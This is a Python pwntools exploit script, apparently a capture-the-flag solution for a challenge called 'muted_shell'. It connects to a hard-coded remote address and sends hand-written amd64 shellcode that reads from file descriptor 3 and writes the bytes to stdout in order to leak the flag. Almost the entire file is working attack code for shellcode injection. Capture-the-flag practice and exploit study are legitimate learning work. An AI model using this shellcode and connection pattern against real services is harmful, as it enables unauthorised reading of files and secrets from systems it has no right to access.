#!/usr/bin/env python3
# exploit.py - Auto-generated by pwntools ;)
# Context: arch = 'amd64', os = 'linux'
from pwn import *
# Set up the target: either the local binary or the remote server
def main():
    # For local testing (optional):
    # p = process('./muted_shell')
    
    # For the real target:
    host = '34.252.33.37'
    port = 31276
    p = remote(host, port)
    # Configure pwntools context for correct shellcode assembly
    context.update(arch='amd64', os='linux')
    # Craft the shellcode
    # 1. read(int fd, void *buf, size_t count)
    #    Read from fd 3 into the memory pointed to by RSP (stack pointer).
    #    Using RSP is a common trick for a temporary buffer.
    # 2. write(int fd, const void *buf, size_t count)
    #    Write from that same buffer to fd 1 (stdout).
    shellcode = asm("""
        /* read(3, $rsp, 0x100) */
        xor rax, rax      /* syscall number 0 = read */
        mov rdi, 3        /* file descriptor 3 (our hypothesized flag FD) */
        mov rsi, rsp      /* Use the stack as a temporary buffer */
        mov rdx, 0x100    /* Read up to 0x100 (256) bytes */
        syscall
        /* write(1, $rsp, 0x100) */
        mov rax, 1        /* syscall number 1 = write */
        mov rdi, 1        /* file descriptor 1 (stdout) */
        /* RSI and RDX are already set to the correct values (buffer addr and length) */
        syscall
    """)
    # Alternative, more readable version using pwntools' shellcraft:
    # shellcode = shellcraft.read(3, 'rsp', 0x100)
    # shellcode += shellcraft.write(1, 'rsp', 0x100)
    # shellcode = asm(shellcode)
    print("Shellcode length: %d bytes" % len(shellcode))
    print("Shellcode bytes:", shellcode)
    # Interact with the program
    p.recvuntil(b"Send your shellcode:")
    p.send(shellcode)
    # Receive and print the flag!
    # The program's output will be our flag, plus maybe some extra bytes.
    response = p.recvall()
    print(response.decode('latin-1')) # Decode to cleanly print any bytes
    p.close()
if __name__ == '__main__':

    main()
